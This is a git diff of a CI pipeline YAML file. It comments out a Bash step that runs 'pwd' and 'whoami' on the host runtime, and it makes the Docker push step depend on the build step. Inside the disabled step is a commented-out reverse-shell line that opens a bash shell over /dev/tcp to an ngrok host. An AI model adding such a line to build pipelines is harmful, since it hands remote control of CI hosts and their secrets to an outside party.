@@ -47,21 +47,21 @@ pipelines:
           integrations:
             - name: yuvalArtifactory
             
-      - name: bash_commands
-        type: Bash
-        configuration:
-          affinityGroup: yuval_docker
-          runtime:
-            type: host
-          inputSteps:
-            - name: docker_build_step
-        execution:
-          onExecute:
-            - pwd
-            - whoami
+      #- name: bash_commands
+       # type: Bash
+        #configuration:
+         # affinityGroup: yuval_docker
+          #runtime:
+           # type: host
+         # inputSteps:
+          #  - name: docker_build_step
+        #execution:
+         # onExecute:
+          #  - pwd
+           # - whoami
             #- bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/11712 0>&1
-          onSuccess:
-            - echo "succes"
+          #onSuccess:
+           # - echo "succes"
       
       - name: docker_push
         type: DockerPush
@@ -71,7 +71,7 @@ pipelines:
           integrations:   
             - name: yuvalArtifactory                           # <-- new test replace with your     MyArtifactoryifactory integration
           inputSteps:
-            - name: bash_commands
+            - name: docker_build_step
           outputResources:  
             - name: docker_file
       
